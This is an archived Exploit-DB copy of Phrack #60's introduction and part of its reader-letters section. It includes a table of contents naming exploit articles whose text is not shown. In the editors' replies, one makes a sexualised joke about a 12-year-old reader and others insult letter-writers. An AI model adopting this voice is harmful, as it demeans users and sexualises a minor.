<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="G1aRy0s4rkrluKB1SNKGYt6Ldsw4k1ZRsz5mCaXZ">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Phrack #60</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/42871">
    <meta name="description" content="Phrack #60">
    <meta name="keywords" content="Magazine,papers">
    <meta name="author" content="phrack">

    <meta property="og:title" content="Phrack #60">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/42871">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2002-12-28" />
        <meta property="article:author" content="phrack" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=9089" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Phrack #60">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Phrack #60
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                42871
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-check"
                                                   style="color: #96b365">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=9089">
                                                                    phrack
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/42871" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 42871">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/42871" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 42871">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=magazine">
                                                                    Magazine
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2002-12-28
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/42870" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/42872" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">                              ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x01 of 0x10

[-]==========================================================================[-]

               _.                      _
              *  `.__________________.&#039;_&#039;._       ___ ___
           /|_____/`._____:    /_____     `._____/  //  /_______|\
          /      \  _`._  \   //   _ \____  `.     //  /  .*      \
         (        \ \  `. /  /_\  /__/   /  / /.__     \.&#039;         )
          \  _____/  \___`.     )    \  :  /  \ `.  \   \_______  /
           \|    /___/ /___/.__/__/\__\___/\_____/_._\____\     |/
                           `-&#039; pHRACK#6o          `-&#039;

[-]==========================================================================[-]


Jingle bells jingle bells jingle all the way...X-MAS TIME IS PHRACK-MAS TIME.

Wow, number #60 is out. Who ever thought that we will get that far :&gt; Let&#039;s
take a look back in time who kept phrack going over all these years. Ladies
and gentlemen, we are proud to present the final, latest, incomplete and
maybe incorrect PHRACK EDITOR IN CHIEF TIMELINE BACK TO THE BEGINNING:

DATE        NAME                                        PHRACKZ
----------+-------------------------------------------+--------------------
2001-08-11                                              (p57..)
1997-09-01 route                                        (p51..p56)
1997-04-09 route, Datastream Cowboy                     (p50)
1996-11-08 route, Datastream Cowboy, Voyager            (p49)
1996-09-01 Voyager, ReDragon, route                     (p48)
1993-03-01 Erik Bloodaxe                                (p42..p47)
1991-09-15 Dispater                                     (p33..p41)
1990-05-28 Crimson Death                                (p31..p32)
1988-10-12 Taran King + Knight Lightning                (p20..p30)
1988-06-07 Crimson Death                                (p18..p19)
1988-04-07 Shooting Shark                               (p17)
1987-11-01 Elric of Imrryr                              (p16)
1985-11-17 Taran King + Knight Ligthning                (p01..p15)
--[[[ BEGIN OF SPACE &amp; TIME - CREATION OF THE UNIVERSE - THE GENESIS ]]]---

..we came a long way...
---------------------------------------------------------------------------


What&#039;s new?

We revived Phrack Prophile to honor those who did some kewl stuff for
the scene.

This issue comes with a new section dedicated to tool annoucements
(Phrack armory). It showcases selected tools that have been released during
the last few month and that we consider cool enough to be mentioned here.



|=[ Table of Contents ]=-------------------------------------------------=|
| 0x01 Introduction                                 Phrack Staff 0x009 kb |
| 0x02 Loopback                                     Phrack Staff 0x00b kb |
| 0x03 Linenoise                                    Phrack Staff 0x01e kb |
| 0x04 Toolz Armory                                 Packet Storm 0x00b kb |
| 0x05 Phrack Prophile on horizon                   Phrack Staff 0x009 kb |
| 0x06 Smashing The Kernel Stack For Fun And Profit         noir 0x03e kb |
| 0x07 Burning the bridge: Cisco IOS exploits                 FX 0x028 kb |
| 0x08 Static Kernel Patching                             jbtzhm 0x072 kb |
| 0x09 Big Loop Integer Protection                 Oded Horovitz 0x067 kb |
| 0x0a Basic Integer Overflows                            blexim 0x01b kb |
| 0x0b SMB/CIFS By The Root                                ledin 0x07c kb |
| 0x0c Firewall Spotting with broken CRC                    Ed3f 0x026 kb |
| 0x0d Low Cost and Portable GPS Jammer                anonymous 0x021 kb |
| 0x0e Traffic Lights                                   plunkett 0x015 kb |
| 0x0f Phrack World News                            Phrack Staff 0x018 kb |
| 0x10 Phrack magazine extraction utility           Phrack Staff 0x015 kb |
|=------------------------------------------------------------=[ 0x282 kb |


  The latest, and all previous, phrack issues are available online at
http://www.phrack.org. Readers without web access can subscribe to the
phrack-distrib mailinglist. Every new phrack is sent as email attachment
to this list. Every new phrack issue (without the attachment) is announced
on the announcement mailinglist.

To subscribe to the announcement mailinglist:
$ mail announcement-subscribe@lists.phrack.org &lt; /dev/null

To subscribe to the distribution mailinglist:
$ mail distrib-subscribe@lists.phrack.org &lt; /dev/null

To retrieve older issues (must subscribe first):
$ mail distrib-index@lists.phrack.org &lt; /dev/null
$ mail distrib-get.&lt;n&gt;@lists.phrack.org &lt; /dev/null
where n indicated the phrack issue [1..60].


Enjoy the magazine!

Phrack Magazine Vol 11 Number 60, Build 3, Dec 28, 2002. ISSN 1068-1035
Contents Copyright (c) 2002 Phrack Magazine.  All Rights Reserved.
Nothing may be reproduced in whole or in part without the prior written
permission from the editors. 
Phrack Magazine is made available to the public, as often as possible, free
of charge.

|=-----------=[ C O N T A C T   P H R A C K   M A G A Z I N E ]=---------=|

Editors           : phrackstaff@phrack.org
Submissions       : phrackstaff@phrack.org
Commentary        : loopback@phrack.org
Phrack World News : pwn@phrack.org

  We have some agressive /dev/null-style mail filter running. We do reply
to every serious email. If you did not get a reply, then your mail was 
probably not worth an answer or was caught by our mailfilter. Make sure 
your mail has a non-implicit destination, one recipient, a non-empty 
subject field, and does not contain any html code and is 100% 7bit clean
pure ascii.

|=-----------------------------------------------------------------------=|

Submissions may be encrypted with the following PGP key:

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.6 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBD03YTYRBADYg6kOTnjEfrMANEGmoTLqxRZdfxGpvaU5MHPq+XHvuFAWHBm2
xB/9ZcRt4XIXw0OTL441ixL6fvGPNxjrRmAUtXSWrElGJ5lTj7VdJmdt/DbehzGb
NXekehG/r6KLHX0PqNzcr84sY6/GrZUiNZftYA/eUWDB7EjEmkBIMs3bnwCg3KRb
96G68Zc+T4ebUrV5/dkYwFUEAMgSGJpdy8yBWaFUsGOsGkrZZfdf6tRA+GGOnqjS
Lh094L8iuTfbxr7zO4E5+uToantAl56fHhnEy7hKJxuQdW1C0GKktUDhGltUxrob
zsNdN6cBprUT7//QgdOlm3nE2E5myozhhMxLMjjFl1mNo1YrNUEU4tYWm/Zvg9OF
Te8TBADS4oafB6pT9BhGOWhoED1bQRkk/KdHuBMrgwK8vb/e36p6KMj8xBVJNglY
JtIn6Iv14z8PtO62SEzlcgdsieoVncztQgLIrvCN+vKjv8jEGFtTmIhx6f/VC7pX
oLX2419rePYaXCPVhw3xDN2CVahUD9jTkFE2eOSFiWJ7DqUsIrQkcGhyYWNrc3Rh
ZmYgPHBocmFja3N0YWZmQHBocmFjay5vcmc+iFcEExECABcFAj03YTYFCwcKAwQD
FQMCAxYCAQIXgAAKCRB73vey7F3HClWRAJ4qxMAMESfFb2Bbi+rAb0JS4LnSYwCZ
AWI6ndU+sWEs/rdD78yydjPKW9q5Ag0EPTdhThAIAJNlf1QKtz715HIWA6G1CfKb
ukVyWVLnP91C1HRspi5haRdyqXbOUulck7A8XrZRtDUmvMGMO8ZguEjioXdyvYdC
36LUW8QXQM9BzJd76uUl/neBwNaWCHyiUqEijzkKO8yoYrLHkjref48yBF7nbgOl
i1y3QOyDGUT/sEdjE5lzHqVtDxKH9B8crVkr/O2GEyr/zRu1Z2L5TjZNcQO988Hy
CyBdDVsCBwUkdrm/oyqnSiypcGzumD4pYzmquUw1EYJOVEO+WeLAOrfhd15oBZMp
QlQ/MOfc0rvS27YhKKFAHhSchSFLEppy/La6wzU+CW4iIcDMny5xw1wNv3vGrScA
AwUH/jAo4KbOYm6Brdvq5zLcEvhDTKf6WcTLaTbdx4GEa8Sj4B5a2A/ulycZT6Wu
D480xT8me0H4LKl2j7lzhJwzG9HRp846gKrPgj7GVcAaTtsXgwJu6Q7fH74PCrOt
GEyvJw+hRiQCTHUC22FUAx6SHZ5KzwMs3W8QnNUbRBfbd1hPMaEJpUeBm/jeXSm4
2JLOd9QjJu3fUIOzGj+G6MWvi7b49h/g0fH3M/LF5mPJfo7exaElXwk1ohyPjeb8
s11m348C4JqmFKijAyuQ9vfS8cdcsYUoCrWQw/ZWUIYSoKJd0poVWaHQwuAWuSFS
4C8wUicFDUkG6+f5b7wNjfW3hf2IRgQYEQIABgUCPTdhTgAKCRB73vey7F3HCq5e
AJ4+jaPMQEbsmMfa94kJeAODE0XgXgCfbvismsWSu354IBL37BtyVg9cxAo=
=9kWD
-----END PGP PUBLIC KEY BLOCK-----


phrack:~# head -22 /usr/include/std-disclaimer.h
/*
 *  All information in Phrack Magazine is, to the best of the ability of
 *  the editors and contributors, truthful and accurate.  When possible,
 *  all facts are checked, all code is compiled.  However, we are not
 *  omniscient (hell, we don&#039;t even get paid).  It is entirely possible
 *  something contained within this publication is incorrect in some way.
 *  If this is the case, please drop us some email so that we can correct
 *  it in a future issue.
 *
 *
 *  Also, keep in mind that Phrack Magazine accepts no responsibility for
 *  the entirely stupid (or illegal) things people may do with the
 *  information contained herein.  Phrack is a compendium of knowledge,
 *  wisdom, wit, and sass.  We neither advocate, condone nor participate
 *  in any sort of illicit behavior.  But we will sit back and watch.
 *
 *
 *  Lastly, it bears mentioning that the opinions that may be expressed in
 *  the articles of Phrack Magazine are intellectual property of their
 *  authors.
 *  These opinions do not necessarily represent those of the Phrack Staff.
 */

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


phrack.org:~# cat /dev/random

                           ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x02 of 0x10

|=----------------------=[ L O O P B A C K ]=----------------------------=|
|=-----------------------------------------------------------------------=|
|=------------------------=[ phrackstaff ]=------------------------------=|


----| QUOTE of the month

    [ Once upon a time in #phrack ]

&lt;OUAH:#phrack&gt; *** PHRACK #60 SCHEDULED FOR 2002-12-27 ***
&lt;chmod_:#phrack&gt; i know
&lt;chmod_:#phrack&gt; its already 2 hours late
&lt;phrack_webmaster_undercover:#phrack&gt; is it already the 27th?
&lt;chmod_:#phrack&gt; yes
&lt;chmod_:#phrack&gt; in some parts of the world
&lt;bajkero:#phrack&gt; Fri Dec 27 02:01:13 CET 2002

    [ Meanwhile: phrack_webmaster_undercover doing the
      s/27th/28th/g thingie on index.php ]

&lt;phrack_webmaster_undercover:#phrack&gt; hmm. strange, it reads 28th here.
&lt;chmod_:#phrack&gt; they changed recently
&lt;chmod_:#phrack&gt; it was 27th just one hour ago
&lt;phrack_webmaster_undercover:#phrack&gt; mysterious...

----| Statistics of the month

root@phrack.org:/var/log &gt; grep &#039;\.mil&#039; httpd_access.log | uniq | wc -l
    248
root@phrack.org:/var/log &gt; grep &#039;\.gov&#039; httpd_access.log | uniq | wc -l
    937

|=[ 0x01 ]=--------------------------------------------------------------=|

Editor in Chief!!!!

[ Nope, sorry I&#039;m just the phrackstaff&#039;s slave answering the emails. ]

I have been trying to get the phrack magazine but upto date I have not
succeeded.. I come from an African country called &quot;kenya&quot; and it seems they
dont bring them there!!!!!! Please send me the subscription and the
magazines if it posssible and bill me later,.....

[ Kenya, 1.00North, 38.00East, 582,650sq, higest point you can read
  phrack: Mount Kenya 5,199m, lowest point: Indian Ocen (0m hehe.).
  Potential number of phrack readers: 31,138,735. Hacker growth rate: 1.15%,
  hackers life expactancy at birth: 47.02 years, Literacy: age 15 and over
  can read phrack. 78.1% of the total population can read phrack.
  http://www.cia.giv/cia/publications/factbook/geos/ke.html ]
  
My address is fredie@kikuyu.com

Yours truly

Fredie..

[ Phrack is free. Nice to know that phrack read in all parts of the world,
  we definitely want to hear from you more often ]

|=[ 0x02 ]=--------------------------------------------------------------=|

From: Omar Tarabay &lt;omar_tarabay@yahoo.com&gt;
Subject: a real newbie

Hey guys,

    [ Hello dude ]

I read your last edition and it was just great, i visited the site daily
to see if the new edition is down or not.

    [ oh, so that&#039;s you in the weblogs? Hi :&gt; ]
    
I realy liked the files on your last edition (lockpicking was the greatest)
i won&#039;t ask questions that you expect me to ask like &#039;please tell me how to
hack into hotmail or the pentagon&#039;.

    [ Oh man, you missed it, I had some 0day for you ]

put i read myself and learn things myself but as a newbie i don&#039;t find
most of your articles understandable,its only for experts and pros so
if you can write articles for newbies like me and many others who want to
learn please do, and about myself i amTURBOWEST(i am sure that u can know
my real name easily but please don&#039;t say it)

    [ Your real name is: TURBOEAST! ]

I am 12 y/o

   [ Nothing to be ashamed of. We will be at the same age in 13 years. ]

I program in python . I am trying to install linux on my PC but i face
some problems which i am trying to solve(i read a lot of books about
linux)

    [ You read these linux books? What did they teach you? How to format
      your harddrive, install a webcam and masturbate with 13 years old 
      girls on netmeetings? ]

finaly i would like to say thanks for all the phrack staff and ask them to
reply to me.

TURBOWEST

   [ Nothing. Hope you wont get any problems with the pedophile child
     molesters who get back to you now... ]

|=[ 0x03 ]=--------------------------------------------------------------=|

From: George escobar &lt;dierwolf2@yahoo.com&gt;
Subject: thanks

i found your site informative. thanks  
        dierwolf2

    [ at your service! We dont take money donation, however you can send
      female shaped human beings. ]

|=[ 0x04 ]=--------------------------------------------------------------=|

From: &quot;Anthony Webb&quot; &lt;a_gentle_man@hotmail.com&gt;
Subject: OK..I&#039;m stupid, but help me anyway

OK, I admit it...I love the website, but I can&#039;t find my way around in it.
Yeah, I know, I&#039;m dumber than a bag of rusty hammers.  But I need help.

    [ It is a good start to admit it, let&#039;s look at your case ]

I am looking for a simple program to keep track of my companies phone calls
without the company knowing I&#039;m doing it.

    [ Oh man ... that&#039;s not good at all ... ]

No, I am NOT paranoid, they ARE out to get me.

    [ Honestly, you are not! Be prepared for the worst! Watch Jackie Chan
      and Akira movies on a daily base to train your ninja-style to be
      prepared to whatever there might come. Huh? Did you hear that?
      THEY ARE ALREADY AT YOUR DOOR. RUUUUUUUUUUUUUUUUUUN! ]

I don&#039;t have $1100 to $2500 to spend on Call Accounting Software and I
don&#039;t need all those bells and whistles anyway. I just need to keep track
of who the people are talking to, what time, what extension, whether its
outbound or inbound, etc. The company has an Avaya (Lucent) Merlin Magix
PBX system. By tracking who they call I can establish that they are indeed
guilty of harrassment against my paranoid little butt.

Got any ideas? gentle....but pissed at the organization.

    [ Are you sure that noone of your coworkers watched this email? ]

|=[ 0x05 ]=--------------------------------------------------------------=|

From: domino@hush.com

can I please get those zines in zip format, they are interesting, but I use
windows. If not, can you complete the articles? I was reading one, and it
was in txt and it said 9 of 10. there was no link to the 10th article. this
happened many times with different ones. Yeah anyways, I would be nice to
have those as zip files for those who don&#039;t have linux as would many others,
or at least fix the links. (not much of a problem just missing a page)
Great magazine, I just wish that I could complete it. thanx.

[ (man winzip) || (man google) || (man brain) || (man life) || (man gun) ]

|=[ 0x06 ]=--------------------------------------------------------------=|

From: &quot;melissa royer&quot; &lt;melissa.royer@verizon.net&gt;

Hello

I am having some trouble compiling the code extracted from your site. I
have the code on linux RH 7.3 Is this the problem??

[root@lenny Loki]# make linux

make[1]: *** [surplus.o] Error 1
make[1]: Leaving directory `/loki/loki2/Loki&#039;
make: *** [linux] Error 2

[ I swear this dood^H^H^H^H Melissa really tried to compile that 7 years old
  source from p49. Unless we turn into a red-hat-gcc-problems-support-center
  will we not give any hints. Rumours about any fusion on the latter topic
  can not be confirmed or denied at this point. ]

|=[ 0x07 ]=--------------------------------------------------------------=|

[ someone with a &#039;new&#039; and &#039;unbreakable&#039; crytpo idea of his own ]

[ blah blah ] ...didn&#039;t know Applied Cryptography, thanks for the link.
[ blah blah ] ...one time pad are maybe not very usefull but they are for
hackers ...[ blah blah ]. When a friend of mine rooted NASA i used one-time
pads to tell my other friends [ blah blah blah ].

[ So what&#039;s your general recommendation then? That we should banish
  blowfish and use one-time-pad&#039;s because they are..err..better when
  we want to tell our...err..friends that we ..err..hacked NASA? hu? ]

|=[ 0x08 ]=--------------------------------------------------------------=|

From: &quot;Bowman, Michael&quot; &lt;Michael.Bowman@ed.gov&gt;

SUBSCRIBE Phrack

    [ Dear Government Of Education, you failed to subscribe where your
      our schoolars already succeeded. Please ask your classmate if you
      have any further problems. We are awaiting your second trial until
      next monday or we are urget to inform the director about your lack
      of success. ]

|=[ 0x09 ]=--------------------------------------------------------------=|

[ from web comments to phrack 3-9, 2002-11-07
FromL laipie@ms14.url.com.tw

Hello
I want to download some material from your website.

    [ Our links are protected by some kind of intelligent checker. You
      have to press ALT-Q while clicking on the link (quickly!). ]

|=[ 0x0a ]=--------------------------------------------------------------=|

From: &quot;Dustin Smith&quot; &lt;dustinsmith01@hotmail.com&gt;
Subject: The unfortunate life...

Well you may know me as the &quot;script kiddy&quot; but lately i ma having 
illusions of Grandure and am aspiring to be...I dont dare say it
cuz I am stillso far off but yet so close.  So a subsription to your Holy 
grail will be just peaches...In all humbleness of the greatness
that is possed by few I bid you adue...

    [ THIS IS NOT MADE UP! We really get these kind of emails! ]


_________________________________________________________________
Broadband? Dial-up? Get reliable MSN Internet Access. 

    [ Get a brain first! ]

|=[ 0x0b ]=--------------------------------------------------------------=|

From: &quot;Princess Of Darkness&quot; &lt;broken_flowers@hotmail.com&gt;
Subject: symantec


uhh... hello.

::waves::

My name&#039;s Rosie. hi.  I really actually know very little to nothing about 
hacking..  and it&#039;d like to know more.  I know links, websites, etc. etc.  

    [ That&#039;s a beginning!
      Lesson2: &quot;How do I read the website&quot;.
      Lesson3: &quot;How do I understand the website&quot;
      Lesson4: &quot;How do I utilize the website&quot;
      Lesson5: &quot;How do I hire for a lawyer&quot;
      Lesson6: &quot;How do I escape the feds&quot; ]

but when you can&#039;t even write html it makes things a little difficult.  God 
I feel so retarded. don&#039;t laugh. I&#039;m a lam0r, i know.

    [ The real reason why phrack comes as .txt is because noone knows
      this &lt; &gt; -thingie either. ]

anyway, thanks a lot for like.. reading this...

    [ thanks a lot for like.. writing this... ]

